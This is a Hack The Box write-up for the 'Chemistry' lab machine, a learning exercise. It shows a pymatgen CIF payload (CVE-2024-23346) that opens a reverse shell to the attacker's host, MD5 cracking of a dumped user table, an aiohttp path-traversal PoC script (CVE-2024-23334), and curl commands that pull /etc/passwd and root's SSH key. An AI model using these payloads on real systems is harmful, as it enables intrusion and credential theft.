# Hack the Box - "chemistry" - 10.10.11.38
# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -sC -sV -vv 10.10.11.38
```

Output
```
PORT     STATE SERVICE REASON         VERSION                                      19:09:23 [70/112]
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                     
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)                     
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaP
Nsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fy
NnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=                
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=                          
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB 
5000/tcp open  upnp?   syn-ack ttl 63                                              
| fingerprint-strings:                                                             
|   GetRequest:                                                                    
|     HTTP/1.1 200 OK                                                              
|     Server: Werkzeug/3.0.3 Python/3.9.5                                          
|     Date: Wed, 29 Jan 2025 01:07:49 GMT                                          
|     Content-Type: text/html; charset=utf-8                                       
|     Content-Length: 719                                                          
|     Vary: Cookie                                                                 
|     Connection: close                                                            
|     <!DOCTYPE html>                                                              
|     <html lang="en">                                                             
|     <head>                                                                       
|     <meta charset="UTF-8">                                                       
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1> 
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

## Port 80
>![[Pasted image 20250128192252.png]]

 
---

# Vulnerabilities

We are able to register for an account to the portal and from there we can upload a CIF document.
>![[Pasted image 20250128202811.png]]

Searching for information on Crystallographic Information File vulnerabilities. We run across an article about a Critical Security Flaw in Pymatgen Library(CVE-2024-23346). 

We can use the example CIF file and input the vulnerable code to the bottom of it to gain a shell as the "app" user.
```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.3/1337 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
>![[Pasted image 20250128204009.png]]

After listing all the files in the "app" user home directory we see an app.py file. This file has a 'SECRET_KEY' hardcoded for a sqlite database in it.
`MyS3cretCh3mistry4PP`
>![[Pasted image 20250128204801.png]]

There is a database.db file located in the instances folder.
Using sqlite you can open the database to view it's contents.
```
#Open the database
sqlite3 database.db

#View the tables
.tables

#Extract data from the user table.
select * from user;
```
We see a few users that we are interested in for access, admin and rosa(this user has console access as shown in /etc/passwd)
>![[Pasted image 20250128210424.png]]

We can now use hashcat to decide the MD5 password.
```
hashcat -m 0 -a 0 "63ed86ee9f624c7b14f1d4f43dc251a5" /usr/share/wordlists/rockyou.txt
```

Success we have Rosa's password.
```
rosa:unicorniosrosados
```

With that we can SSH into the machine as Rosa.
>![[Pasted image 20250128210758.png]]

---

# Privilege Escalation

Taking a look at the running processes we can see that port 8080 is open only to internal traffic.
We forward the port to our localhost and view the webpage.
```
ssh -L 8888:localhost:8080 rosa@10.10.11.38
```
>![[Pasted image 20250128211528.png]]

Running whatweb on the domain we can see that it is running a vulnerable version of aiohttp/3.9.1.(CVE-2024-23334).
```
whatweb http://127.0.0.1:8888
```
>![[Pasted image 20250128215503.png]]

Looking up this info we can find PoC code. I used the one from wizarddos.
```
import argparse
import http.client
import textwrap
import urllib


def exploit(url, file, dir):
    parsed_url = urllib.parse.urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)

    traversal  = "/.."
    payload = dir
    for i in range(15):
        payload += traversal

        print(f'''[+] Attempt {i}
                    Payload: {payload}{file}
        ''')

        conn.request("GET", f"{parsed_url.path}{payload}{file}")
        res = conn.getresponse()
        result = res.read()
        print(f"                    Status code: {res.status}")

        if res.status == 200:
            print("Respose: ")
            print(result.decode())
            break



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(''' Usage:
            exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static
        ''')
    )

    parser.add_argument('-u', '--url', help="Aiohttp site url")
    parser.add_argument('-f', '--file', help="File to read")
    parser.add_argument('-d', '--directory', help="Directory with static files. Default: /static", default="/static")

    args = parser.parse_args()
    if args.url and args.file and args.directory:
        exploit(args.url, args.file, args.directory)
        print("Exploit complete")
    else:
        print("Error: One of the parameters is missing")
```

After trying this script it is obvious something is wrong. The static page does not exist for us. We need to alter this script to work for us.

Running a fuff scan to discover any directories we can see that directory we need to us.
```
ffuf -ic -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1:8888/FUZZ
```

With that scan we get the "assets" directory.

Running the script with the "assets" directory gives us what we want.
```
python3 exploit.py -u http://127.0.0.1:8888 -f /etc/passwd -d /assets
```

Now that we know the directory and count of traversals we need we can use a curl command to only pull what we need.

```
curl -s --path-as-is "http://127.0.0.1:8888/assets/../../../etc/passwd"
```

We can now pull the id_rsa for root using this command.
```
curl -s --path-as-is "http://127.0.0.1:8888/assets/../../../root/.ssh/id_rsa"
```
>![[Pasted image 20250128222044.png]]

Using the command again we can just save it to a file to us.
```
curl -s --path-as-is "http://127.0.0.1:8888/assets/../../../root/.ssh/id_rsa" > chemistry_id_rsa 
```

Now all that is left to do is change the permissions of the file and ssh to the machine as root.
```
chmod 700 chemistry_id_rsa
```
>![[Pasted image 20250128222540.png]]

---

# Loot
## User
Command
```
ifconfig;id;hostname;cat user.txt
```
`2a1fc5ada2d7c9e6d9d8701be56d1646`
>![[Pasted image 20250128211216.png]]

## Root/Admin
Command
```
ifconfig;id;hostname;cat root.txt
```
`3ab313bfaf610a72e2171eac97f993d4`
>![[Pasted image 20250128222624.png]]
